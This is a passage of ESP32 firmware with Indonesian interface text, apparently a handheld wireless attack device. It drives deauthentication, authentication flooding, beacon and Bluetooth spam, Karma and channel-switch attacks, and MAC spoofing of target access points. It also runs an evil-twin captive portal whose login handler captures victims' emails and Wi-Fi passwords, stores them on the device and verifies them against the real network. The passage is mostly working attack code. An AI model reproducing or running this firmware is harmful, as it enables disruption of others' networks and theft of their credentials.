  portENTER_CRITICAL(&g_probeLogMux);
  count = g_probeLogCount;
  int head = g_probeLogHead;
  show = (count < 4) ? count : 4;
  for (int i = 0; i < show; i++) {
    int idx = (head - show + i + PROBE_LOG_SIZE) % PROBE_LOG_SIZE;
    snapshot[i] = g_probeLog[idx];
  }
  portEXIT_CRITICAL(&g_probeLogMux);

  for (int i = 0; i < show; i++) {
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.setCursor(4, 40 + (i * 18));
    char buf[64];
    snprintf(buf, sizeof(buf), "%-8.8s %3d %4d  %s",
      vendorFromMacBytes(snapshot[i].mac),
      snapshot[i].count,
      snapshot[i].rssi,
      snapshot[i].ssid[0] ? snapshot[i].ssid : "(hidden)");
    tft.print(buf);
  }
  if (count == 0) {
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
    tft.setCursor(4, 45); tft.print("Menunggu probe");
    for (int i = 0; i < (frame % 4); i++) tft.print(".");
  }
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setCursor(4, 108); tft.print("Total: " + String(count));
  drawFooter("TEKAN TOMBOL = STOP");
}

void drawBTSpam(int frame) {
  tft.fillScreen(TFT_BLACK);
  drawHeader("BLUETOOTH SPAM", TFT_BLUE);
  tft.setTextFont(2); tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, 30); tft.print("Mode: ");
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.println("MULTI VENDOR");
  tft.setCursor(10, 52); tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.print("Payload: ");
  tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.println("8 rotasi");
  tft.setCursor(10, 74); tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.print("Broadcasting BLE");
  for (int i = 0; i < (frame % 4); i++) tft.print(".");
  int bx = 200, by = 75;
  tft.drawLine(bx, by, bx, by+20, TFT_BLUE);
  tft.drawLine(bx, by+10, bx+8, by+5, TFT_BLUE);
  tft.drawLine(bx+8, by+5, bx+8, by+15, TFT_BLUE);
  tft.drawLine(bx+8, by+15, bx, by+10, TFT_BLUE);
  if (frame % 4 < 2) tft.fillCircle(bx+14, by+10, 2, TFT_CYAN);
  drawFooter("TEKAN TOMBOL = STOP");
}

// ═══════════════════════════════════════════════
// CSA UI  [PATCH 2]
// ═══════════════════════════════════════════════
void drawCSARunning(int frame) {
  tft.fillScreen(TFT_BLACK);
  drawHeader("CSA ATTACK", TFT_ORANGE);
  tft.setTextFont(2); tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, 26); tft.print("Target: ");
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  String s = targetSSID; if (s.length() > 16) s = s.substring(0, 16);
  tft.println(s);

  tft.setCursor(10, 46); tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.print("Ch asli: ");
  tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.print(g_targetChannel);

  tft.setCursor(10, 66); tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.print("Paket: ");
  tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.println(g_packetsSent);

  tft.setCursor(10, 86); tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.print("Korban: ");
  if (g_victimFound) {
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    char buf[24];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X...",
             g_victimMAC[0], g_victimMAC[1], g_victimMAC[2]);
    tft.println(buf);
  } else {
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
    tft.println("scanning");
  }

  int cx = 205, cy = 90;
  const char* spin = "|/-\\";
  tft.setTextColor(TFT_ORANGE, TFT_BLACK);
  tft.setCursor(190, 90);
  tft.print("CH ");
  tft.print(spin[frame % 4]);

  drawFooter("TEKAN TOMBOL = STOP");
}

int drawWrapped(String text, int x, int y, int maxW, uint16_t color, int lineH) {
  tft.setTextFont(2);
  tft.setTextColor(color, TFT_BLACK);
  while (text.length() > 0) {
    int n = text.length();
    while (n > 1 && tft.textWidth(text.substring(0, n), 2) > maxW) n--;
    tft.setCursor(x, y);
    tft.print(text.substring(0, n));
    text = text.substring(n);
    y += lineH;
  }
  return y;
}

void drawEvilTwinRunning(int frame) {
  if (isReleasing) {
    tft.fillScreen(TFT_BLACK);
    drawHeader("RELEASING VICTIM", TFT_GREEN);
    tft.setTextFont(2);
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.setCursor(10, 30); tft.print("Email:");
    int ny = drawWrapped(capturedEmail, 80, 30, 150, TFT_WHITE, 18);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.setCursor(10, ny); tft.print("Pass:");
    ny = drawWrapped(capturedPass, 80, ny, 150, TFT_WHITE, 18);
    int secsLeft = 2 - ((millis() - releaseTimer) / 1000);
    if (secsLeft < 0) secsLeft = 0;
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.setCursor(10, ny + 2);
    tft.print("Verify: "); tft.print(secsLeft); tft.println(" detik");
    int barX = 10, barY = ny + 20, barW = 220, barH = 12;
    tft.drawRect(barX, barY, barW, barH, TFT_WHITE);
    tft.fillRect(barX+1, barY+1, (secsLeft*(barW-2))/2, barH-2, TFT_GREEN);
    drawFooter("VERIFIKASI PASSWORD...");
    return;
  }

  if (isVerifying) {
    tft.fillScreen(TFT_BLACK);
    drawHeader("VERIFIKASI PASSWORD", TFT_ORANGE);
    tft.setTextFont(2); tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.setCursor(10, 40); tft.println("Mencoba koneksi ke");
    tft.setCursor(10, 60); tft.println("AP target asli...");
    tft.setCursor(10, 82); tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.print("Percobaan: "); tft.print(verifyAttempts + 1);
    tft.print("/"); tft.println(MAX_VERIFY_ATTEMPTS);
    int spinIdx = (millis() / 200) % 4;
    const char* spin = "|/-\\";
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.setCursor(10, 100);
    tft.print("Progress: "); tft.print(spin[spinIdx]);
    drawFooter("MOHON TUNGGU (6s)...");
    return;
  }

  tft.fillScreen(TFT_BLACK);
  drawHeader("EVIL TWIN AKTIF", TFT_MAGENTA);
  tft.setTextFont(2); tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.setCursor(10, 30); tft.print("Clone: ");
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  String ssid = targetSSID;
  if (ssid.length() > 14) ssid = ssid.substring(0, 14);
  tft.println(ssid);

  if (verifyAttempts > 0) {
    tft.setTextColor(TFT_ORANGE, TFT_BLACK);
    tft.setCursor(10, 45);
    tft.print("Percobaan: "); tft.print(verifyAttempts);
    tft.print("/"); tft.println(MAX_VERIFY_ATTEMPTS);
  }

  int clients = WiFi.softAPgetStationNum();

  if (clients > 0) {
    int pulse = ((frame % 8) - 4); if (pulse < 0) pulse = -pulse;
    uint16_t pc = (frame % 8 < 4) ? TFT_GREEN : TFT_DARKGREEN;
    drawCornerBrackets(4 + pulse, 61 - pulse, 232 - pulse*2, 30 + pulse*2, pc);
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.setCursor(10, 65);
    tft.print("KORBAN: "); tft.print(clients); tft.println(" HP");
    tft.setTextColor(TFT_ORANGE, TFT_BLACK);
    tft.setCursor(10, 85);
    tft.print("Menunggu password");
    for (int i = 0; i < (frame % 4); i++) tft.print(".");
  } else {
    tft.setTextColor(TFT_ORANGE, TFT_BLACK);
    tft.setCursor(10, 65); tft.println("Korban: Belum ada");

    if (millis() - evilTwinStartTime < 3000) {
      tft.setTextColor(TFT_CYAN, TFT_BLACK);
      tft.setCursor(10, 85);
      tft.print("Menyiarkan SSID...");
    } else {
      tft.setTextColor(TFT_RED, TFT_BLACK);
      tft.setCursor(10, 85);
      tft.print("MENEMBAK DEAUTH");
      for (int i = 0; i < (frame % 4); i++) tft.print(".");
      const char* spin = "|/-\\";
      tft.setTextColor(TFT_YELLOW, TFT_BLACK);
      tft.setCursor(10, 100);
      tft.print("Radar: "); tft.print(spin[frame % 4]);
    }
  }
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextFont(1);
  tft.setCursor(150, 30);
  tft.print("P:" + String((uint32_t)g_packetsSent) + " E:" + String((uint32_t)g_txErrors));
  tft.setTextFont(2);
  drawFooter("TEKAN TOMBOL = STOP");
}

void drawViewPasswords() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("PASSWORD TERSIMPAN", TFT_DARKCYAN);
  int total = prefs.getInt("pwd_count", 0);
  tft.setTextFont(2);

  if (total == 0) {
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.setCursor(10, 40); tft.println("Belum ada data.");
    drawFooter("TOMBOL = KEMBALI");
    return;
  }

  if (viewSelection >= total) {
    int y = 42;
    if (viewSelection == total) {
      tft.fillRect(0, y, 240, 28, TFT_RED);
      tft.setTextColor(TFT_WHITE, TFT_RED);
      tft.setCursor(10, y + 6);
      tft.print(confirmDeleteAll ? "YAKIN? TEKAN LAGI!" : "HAPUS SEMUA DATA");
    } else {
      tft.fillRect(0, y, 240, 28, TFT_DARKGREEN);
      tft.setTextColor(TFT_WHITE, TFT_DARKGREEN);
      tft.setCursor(10, y + 6);
      tft.print("< KEMBALI >");
    }
    drawFooter("ATAS: Pilih | BAWAH: OK");
    return;
  }

  int idx = viewSelection;
  String entry = prefs.getString(("pwd_" + String(idx)).c_str(), "");
  int p1 = entry.indexOf('|');
  String email = (p1 > 0) ? entry.substring(0, p1) : entry;
  String rest = (p1 > 0) ? entry.substring(p1 + 1) : "";
  int p2 = rest.indexOf('|');
  String pass = (p2 > 0) ? rest.substring(0, p2) : rest;
  String ver = (p2 > 0) ? rest.substring(p2 + 1) : "";

  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.setCursor(10, 30); tft.print("Email:");
  int ny = drawWrapped(email, 80, 30, 150, TFT_WHITE, 18);

  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.setCursor(10, ny); tft.print("Pass:");
  ny = drawWrapped(pass, 80, ny, 150, TFT_GREEN, 18);

  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, ny + 4);
  tft.print("Status: ");
  tft.setTextColor((ver == "1") ? TFT_GREEN : TFT_RED, TFT_BLACK);
  tft.print((ver == "1") ? "BENAR" : ((ver == "0") ? "SALAH" : "?"));

  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.setCursor(10, ny + 22);
  tft.print("Data "); tft.print(idx + 1); tft.print("/"); tft.print(total);

  drawFooter("ATAS: Pilih | BAWAH: Hapus");
}


// ═══════════════════════════════════════════════
// Karma UI
// ═══════════════════════════════════════════════
void sortKarmaSSIDs() {
  for (int i = 0; i < g_karmaSSIDCount - 1; i++) {
    for (int j = i + 1; j < g_karmaSSIDCount; j++) {
      if (g_karmaSSIDs[j].probeCount > g_karmaSSIDs[i].probeCount) {
        KarmaSSIDEntry tmp = g_karmaSSIDs[i];
        g_karmaSSIDs[i] = g_karmaSSIDs[j];
        g_karmaSSIDs[j] = tmp;
      }
    }
  }
}

void drawKarmaScan(int frame) {
  tft.fillScreen(TFT_BLACK);
  drawHeader("KARMA SCAN", TFT_MAGENTA);
  tft.setTextFont(2); tft.setTextColor(TFT_WHITE, TFT_BLACK);

  unsigned long elapsed = millis() - karmaScanStart;
  int remain = (KARMA_SCAN_DURATION_MS > elapsed)
               ? (KARMA_SCAN_DURATION_MS - elapsed) / 1000 : 0;

  tft.setCursor(10, 28); tft.print("Waktu: ");
  tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.print(remain); tft.println("s");

  tft.setCursor(10, 44); tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.print("Klien: ");
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.print(g_karmaClientCount);
  tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.print("  SSID: ");
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.println(g_karmaSSIDCount);

  tft.setCursor(10, 60); tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.print("Response: ");
  tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.println((uint32_t)g_karmaResponses);

  int cx = 200, cy = 55;
  for (int i = 0; i < 3; i++) {
    int r = (frame * 3 + i * 10) % 25;
    if (r > 2) tft.drawCircle(cx, cy, r, r < 12 ? TFT_MAGENTA : TFT_PURPLE);
  }
  tft.fillCircle(cx, cy, 2, TFT_PINK);

  tft.drawFastHLine(0, 78, 240, TFT_DARKGREY);
  tft.setTextFont(1); tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.setCursor(4, 80); tft.print("TOP SSID (live):");

  KarmaSSIDEntry temp[KARMA_MAX_SSIDS];
  memcpy(temp, g_karmaSSIDs, sizeof(temp));
  for (int i = 0; i < g_karmaSSIDCount - 1; i++) {
    for (int j = i + 1; j < g_karmaSSIDCount; j++) {
      if (temp[j].probeCount > temp[i].probeCount) {
        KarmaSSIDEntry t = temp[i]; temp[i] = temp[j]; temp[j] = t;
      }
    }
  }
  for (int i = 0; i < 3 && i < g_karmaSSIDCount; i++) {
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.setCursor(4, 90 + (i * 10));
    char buf[40];
    snprintf(buf, sizeof(buf), "%d. %-16s (%d)",
             i + 1, temp[i].ssid, temp[i].probeCount);
    tft.print(buf);
  }
  if (g_karmaSSIDCount == 0) {
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
    tft.setCursor(4, 90);
    tft.print("Menunggu probe");
    for (int i = 0; i < (frame % 4); i++) tft.print(".");
  }
  drawFooter("TUNGGU / TOMBOL = BATAL");
}

void drawKarmaResults() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("KARMA RESULTS", TFT_GREEN);
  tft.setTextFont(2);

  if (g_karmaSSIDCount == 0) {
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.setCursor(10, 40); tft.println("Tidak ada probe.");
    tft.setCursor(10, 60); tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.println("Kembali tekan OK");
  } else {
    for (int i = 0; i < 4; i++) {
      int idx = karmaScrollPos + i;
      if (idx > g_karmaSSIDCount) break;
      int y = 28 + (i * 22);

      bool isSelected = (idx == karmaSelection);
      bool isBack = (idx == g_karmaSSIDCount);

      if (isSelected) {
        tft.fillRect(0, y, 240, 20, TFT_DARKGREEN);
        drawCornerBrackets(2, y+1, 236, 18, TFT_GREEN);
        tft.setTextColor(TFT_GREEN, TFT_DARKGREEN);
      } else {
        tft.fillRect(0, y, 240, 20, TFT_BLACK);
        tft.setTextColor(TFT_WHITE, TFT_BLACK);
      }

      tft.setCursor(10, y + 2);
      if (idx < g_karmaSSIDCount) {
        String s = String(g_karmaSSIDs[idx].ssid);
        if (s.length() > 14) s = s.substring(0, 14);
        char buf[40];
        snprintf(buf, sizeof(buf), "%-14s %d",
                 s.c_str(), g_karmaSSIDs[idx].probeCount);
        tft.print(buf);
      } else if (isBack) {
        tft.print("<< KEMBALI");
      }
    }

    if (karmaScrollPos > 0) tft.fillTriangle(228, 26, 236, 26, 232, 22, TFT_CYAN);
    if (karmaScrollPos + 4 <= g_karmaSSIDCount) tft.fillTriangle(228, 112, 236, 112, 232, 116, TFT_CYAN);
  }
  drawFooter("ATAS: Pilih | BAWAH: OK");
}

// ═══════════════════════════════════════════════
// NVS helpers
// ═══════════════════════════════════════════════
void savePasswordToNVS(String email, String pass) {
  int count = prefs.getInt("pwd_count", 0);
  if (count < MAX_SAVED_PWDS) {
    prefs.putString(("pwd_" + String(count)).c_str(), email + "|" + pass);
    prefs.putULong(("pwd_ts_" + String(count)).c_str(), millis());
    prefs.putInt("pwd_count", count + 1);
  }
}

void deletePasswordEntry(int idx) {
  int total = prefs.getInt("pwd_count", 0);
  if (idx < 0 || idx >= total) return;
  for (int i = idx; i < total - 1; i++) {
    prefs.putString(("pwd_" + String(i)).c_str(), prefs.getString(("pwd_" + String(i + 1)).c_str(), ""));
    prefs.putULong(("pwd_ts_" + String(i)).c_str(), prefs.getULong(("pwd_ts_" + String(i + 1)).c_str(), 0));
  }
  prefs.remove(("pwd_" + String(total - 1)).c_str());
  prefs.remove(("pwd_ts_" + String(total - 1)).c_str());
  prefs.putInt("pwd_count", total - 1);
}
void updatePasswordVerification(bool ok) {
  int count = prefs.getInt("pwd_count", 0);
  if (count <= 0) return;
  String key = "pwd_" + String(count - 1);
  String entry = prefs.getString(key.c_str(), "");
  int p1 = entry.indexOf('|');
  if (p1 < 0) return;
  String email = entry.substring(0, p1);
  String rest = entry.substring(p1 + 1);
  int p2 = rest.indexOf('|');
  String pass = (p2 > 0) ? rest.substring(0, p2) : rest;
  prefs.putString(key.c_str(), email + "|" + pass + "|" + (ok ? "1" : "0"));
}
void deleteAllPasswordsFromNVS() {
  prefs.clear();
  viewSelection = 0; viewScrollPos = 0;
}

void saveConfig() {
  prefs.putInt("cfg_deauth", cfg_deauth_burst);
  prefs.putInt("cfg_auth", cfg_auth_burst);
  prefs.putInt("cfg_hop", cfg_hop_interval_ms);
  prefs.putInt("cfg_beacon", cfg_beacon_hop_ms);
  prefs.putInt("cfg_reason", cfg_deauth_reason);
  prefs.putString("wifi_ssid", cfg_wifi_ssid);
  prefs.putString("wifi_pass", cfg_wifi_pass);
  prefs.putString("srv_url", cfg_server_url);
  prefs.putString("tpl_url", cfg_template_url);
  prefs.putInt("autosync", cfg_autosync_min);
}

// ═══════════════════════════════════════════════
// Web handlers
// ═══════════════════════════════════════════════
void handleRoot() {
  if (isWebRemoteRunning) {
    server.send_P(200, "text/html", HTML_REMOTE);
    return;
  }
  if (verifyState == 2) {
    server.send_P(200, "text/html", HTML_SUCCESS);
    return;
  }
  if (verifyState == 3) {
    verifyState = 0;
    server.send_P(200, "text/html", HTML_ERROR);
    return;
  }
  if (isReleasing || isVerifying || verifyState == 1) {
    server.send_P(200, "text/html", HTML_VERIFYING);
    return;
  }
  if (useCustomTemplate && g_customTemplate.length() > 0) {
    server.send(200, "text/html", g_customTemplate);
    return;
  }
  server.send_P(200, "text/html", getTemplateForHost(server.hostHeader(), selectedTemplateIdx));
}

void handleLogin() {
  if (server.hasArg("password")) {
    capturedPass = server.arg("password");
    if (server.hasArg("email") && server.arg("email").length() > 0) {
      capturedEmail = server.arg("email");
    } else {
      capturedEmail = "WiFi-Pass";
    }
    Serial.printf("[LOGIN] %s / %s\n", capturedEmail.c_str(), capturedPass.c_str());
    savePasswordToNVS(capturedEmail, capturedPass);
    isReleasing = true;
    releaseTimer = millis();
    verifyState = 1;
    server.send_P(200, "text/html", HTML_VERIFYING);
  } else {
    server.send(400, "text/plain", "Bad Request");
  }
}

void handleNotFound() {
  if (isWebRemoteRunning) {
    server.sendHeader("Location", "http://192.168.4.1/rc", true);
    server.send(302, "text/plain", "");
    return;
  }
  if (useCustomTemplate && g_customTemplate.length() > 0) {
    server.send(200, "text/html", g_customTemplate);
    return;
  }
  server.send_P(200, "text/html", getTemplateForHost(server.hostHeader(), selectedTemplateIdx));
}

// ═══════════════════════════════════════════════
// Engine control
// ═══════════════════════════════════════════════
void applyPromiscuousFilter(bool probeOnly) {
  wifi_promiscuous_filter_t filter;
  filter.filter_mask = probeOnly
    ? WIFI_PROMIS_FILTER_MASK_MGMT
    : (WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA);
  esp_wifi_set_promiscuous_filter(&filter);
}

// ── Karma ──
void startKarmaScan() {
  memset(g_karmaSSIDs, 0, sizeof(g_karmaSSIDs));
  memset(g_karmaClients, 0, sizeof(g_karmaClients));
  g_karmaSSIDCount = 0;
  g_karmaClientCount = 0;
  g_karmaResponses = 0;
  g_karmaActiveMode = true;

  WiFi.mode(WIFI_AP_STA);
  delay(200);
  if (!isWebRemoteRunning) {
    restoreOriginalApMac();
    WiFi.softAP("Karma_Scan", NULL, 1, 1, 8);
    delay(300);
  }

  applyPromiscuousFilter(false);
  esp_wifi_set_promiscuous_rx_cb(packetSniffer_cb);
  esp_wifi_set_promiscuous(true);

  g_attackMode = ATK_KARMA;
  isKarmaRunning = true;
  karmaScanStart = millis();
  Serial.println("[KARMA] Scan started (20s, active mode)");
}

void stopKarmaScan() {
  isKarmaRunning = false;
  g_attackMode = ATK_IDLE;
  resetWifiStateAfterAttack();
  Serial.println("[KARMA] Scan stopped");
}

// ── Deauth ──
void startDeauthEngine() {
  if (isWebRemoteRunning) {
    if (WiFi.getMode() != WIFI_AP_STA) WiFi.mode(WIFI_AP_STA);
  } else {
    WiFi.mode(WIFI_OFF);
    delay(50);
    uint8_t mac[6]; esp_wifi_get_mac(WIFI_IF_AP, mac);
    if (memcmp(mac, g_targetBSSID, 6) != 0) {
      esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, g_targetBSSID);
      if (macErr != ESP_OK) {
        Serial.printf("[WARN] set_mac failed (%d), pakai MAC existing\n", macErr);
      }
      delay(50);
    }
    WiFi.mode(WIFI_AP_STA);
    WiFi.softAP("Deauther_Fix", "12345678", 1, 1); delay(400);
  }
  applyPromiscuousFilter(false);
  esp_wifi_set_promiscuous_rx_cb(packetSniffer_cb);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(g_targetChannel, WIFI_SECOND_CHAN_NONE);
  delay(100);
  g_packetsSent = 0;
  g_txErrors = 0;
  g_victimFound = false;
  isDeauthRunning = true;
  g_attackMode = ATK_DEAUTH_TARGET;
}

void stopDeauthEngine() {
  isDeauthRunning = false;
  g_attackMode = ATK_IDLE;
  resetWifiStateAfterAttack();
}

void startAuthFlood() {
  if (isWebRemoteRunning) {
    if (WiFi.getMode() != WIFI_AP_STA) WiFi.mode(WIFI_AP_STA);
  } else {
    if (WiFi.getMode() != WIFI_AP_STA) WiFi.mode(WIFI_AP_STA);
    uint8_t mac[6]; esp_wifi_get_mac(WIFI_IF_AP, mac);
    if (memcmp(mac, g_targetBSSID, 6) != 0) {
      esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, g_targetBSSID);
      if (macErr != ESP_OK) {
        Serial.printf("[WARN] set_mac failed (%d)\n", macErr);
      }
      delay(50);
    }
    WiFi.softAP("AuthFlood", "12345678", 1, 1); delay(300);
  }
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_channel(g_targetChannel, WIFI_SECOND_CHAN_NONE);
  delay(100);
  g_packetsSent = 0;
  g_txErrors = 0;
  isAuthFloodRunning = true;
  g_attackMode = ATK_AUTH_FLOOD;
}

void stopAuthFlood() {
  isAuthFloodRunning = false;
  g_attackMode = ATK_IDLE;
  resetWifiStateAfterAttack();
}

void startGlobalDeauth() {
  if (WiFi.getMode() != WIFI_AP_STA) WiFi.mode(WIFI_AP_STA);
  if (!isWebRemoteRunning) {
    restoreOriginalApMac();
    WiFi.softAP("Global_Deauth", "12345678", 1, 1); delay(300);
  }
  esp_wifi_set_promiscuous(false);
  g_packetsSent = 0;
  g_txErrors = 0;
  isGlobalDeauthRunning = true;
  g_attackMode = ATK_DEAUTH_GLOBAL;
}

void stopGlobalDeauth() {
  isGlobalDeauthRunning = false;
  g_attackMode = ATK_IDLE;
  resetWifiStateAfterAttack();
}

void startBeaconSpam() {
  if (!isWebRemoteRunning) {
    WiFi.mode(WIFI_AP);
    restoreOriginalApMac();
    WiFi.softAP("Beacon_Init", "12345678", 1, 1); delay(300);
  } else {
    WiFi.mode(WIFI_AP_STA);
  }
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(false);
  g_packetsSent = 0;
  g_txErrors = 0;
  isBeaconRunning = true;
  g_attackMode = ATK_BEACON;
}

void stopBeaconSpam() {
  isBeaconRunning = false;
  g_attackMode = ATK_IDLE;
  resetWifiStateAfterAttack();
}

void startProbeSniffer() {
  if (WiFi.getMode() != WIFI_AP_STA) WiFi.mode(WIFI_AP_STA);
  if (!isWebRemoteRunning) {
    restoreOriginalApMac();
    WiFi.softAP("Probe_Sniff", "12345678", 1, 1); delay(200);
  }
  portENTER_CRITICAL(&g_probeLogMux);
  g_probeLogHead = 0; g_probeLogCount = 0;
  portEXIT_CRITICAL(&g_probeLogMux);
  applyPromiscuousFilter(true);
  esp_wifi_set_promiscuous_rx_cb(packetSniffer_cb);
  esp_wifi_set_promiscuous(true);
  isProbeRunning = true;
  g_attackMode = ATK_PROBE;
}

void stopProbeSniffer() {
  isProbeRunning = false;
  g_attackMode = ATK_IDLE;
  resetWifiStateAfterAttack();
}

void startBTSpam() {
  WiFi.mode(WIFI_OFF);
  if (btSpamInit()) {
    isBTSpamRunning = true;
    g_attackMode = ATK_IDLE;
  }
}

void stopBTSpam() {
  btSpamStop();
  isBTSpamRunning = false;
  resetWifiStateAfterAttack();
}

// ── CSA  [PATCH 2] ──
void startCSAAttack() {
  if (isWebRemoteRunning) {
    if (WiFi.getMode() != WIFI_AP_STA) WiFi.mode(WIFI_AP_STA);
  } else {
    if (WiFi.getMode() != WIFI_AP_STA) WiFi.mode(WIFI_AP_STA);
    uint8_t mac[6]; esp_wifi_get_mac(WIFI_IF_AP, mac);
    if (memcmp(mac, g_targetBSSID, 6) != 0) {
      esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, g_targetBSSID);
      if (macErr != ESP_OK) {
        Serial.printf("[WARN] CSA set_mac failed (%d)\n", macErr);
      }
      delay(50);
    }
    WiFi.softAP("CSA_Init", "12345678", 1, 1); delay(300);
  }
  applyPromiscuousFilter(false);
  esp_wifi_set_promiscuous_rx_cb(packetSniffer_cb);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(g_targetChannel, WIFI_SECOND_CHAN_NONE);
  delay(100);

  strncpy(g_csaTargetSSID, targetSSID.c_str(), 32);
  g_csaTargetSSID[32] = 0;

  g_packetsSent = 0;
  g_txErrors = 0;
  g_victimFound = false;
  isCSARunning = true;
  g_attackMode = ATK_CSA;
  Serial.printf("[CSA] Started on BSSID %02X:%02X:%02X:%02X:%02X:%02X ch=%d SSID=%s\n",
                g_targetBSSID[0], g_targetBSSID[1], g_targetBSSID[2],
                g_targetBSSID[3], g_targetBSSID[4], g_targetBSSID[5],
                g_targetChannel, g_csaTargetSSID);
}

void stopCSAAttack() {
  isCSARunning = false;
  g_attackMode = ATK_IDLE;
  resetWifiStateAfterAttack();
  Serial.println("[CSA] Stopped");
}

// ── Web Remote ──
void drawWebRemoteScreen() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("WEB REMOTE", TFT_DARKGREEN);
  tft.setTextFont(2);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, 28); tft.print("SSID: ");
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.println("NISKALA_CTRL");
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, 48); tft.print("Pass: ");
  tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.println("niskala123");
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, 68); tft.print("URL : ");
  tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.println("192.168.4.1");
  tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
  tft.setCursor(10, 90); tft.print("BAT:"); tft.print(readBatteryPercent());
  tft.print("% T:"); tft.print((int)temperatureRead()); tft.print("C H:"); tft.print(ESP.getFreeHeap());
  drawFooter("TOMBOL = STOP & KEMBALI");
}

void startWebRemote() {
  WiFi.mode(WIFI_AP_STA);
  delay(200);
  restoreOriginalApMac();
  WiFi.softAP("NISKALA_CTRL", "niskala123", 1, 0, 4);
  delay(300);
  server.begin();
  dnsServer.start(53, "*", WiFi.softAPIP());
  isWebRemoteRunning = true;
  Serial.println("[WEB] Remote control aktif");
  drawWebRemoteScreen();
}

void stopWebRemote() {
  server.stop();
  dnsServer.stop();
  resetWifiStateAfterAttack();
  isWebRemoteRunning = false;
  Serial.println("[WEB] Remote control berhenti");
}

void drawOtaScreen() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("OTA UPDATE", TFT_DARKCYAN);
  tft.setTextFont(2);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, 30); tft.print("SSID: ");
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.println("NISKALA_OTA");
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, 52); tft.print("Pass: ");
  tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.println("niskala123");
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, 74); tft.print("IP  : ");
  tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.println("192.168.4.1");
  tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
  tft.setCursor(10, 96); tft.print("pio run -e ota -t upload");
  drawFooter("TOMBOL = KELUAR");
}

void startOTA() {
  WiFi.mode(WIFI_AP);
  restoreOriginalApMac();
  WiFi.softAP("NISKALA_OTA", "niskala123", 1, 0, 1);
  delay(300);
  ArduinoOTA.setHostname("niskala");
  ArduinoOTA.onStart([]() { Serial.println("[OTA] Start"); });
  ArduinoOTA.onEnd([]() { Serial.println("[OTA] End"); });
  ArduinoOTA.onError([](ota_error_t error) { Serial.printf("[OTA] Error %u\n", error); });
  ArduinoOTA.begin();
  isOtaRunning = true;
  drawOtaScreen();
  Serial.println("[OTA] Aktif di 192.168.4.1");
}

void stopOTA() {
  isOtaRunning = false;
  resetWifiStateAfterAttack();
  Serial.println("[OTA] Berhenti");
}

// ------------------------------------------------------------------
// BLE Scanner & MAC Tracking
// ------------------------------------------------------------------
class BleScanCallbacks : public BLEAdvertisedDeviceCallbacks {
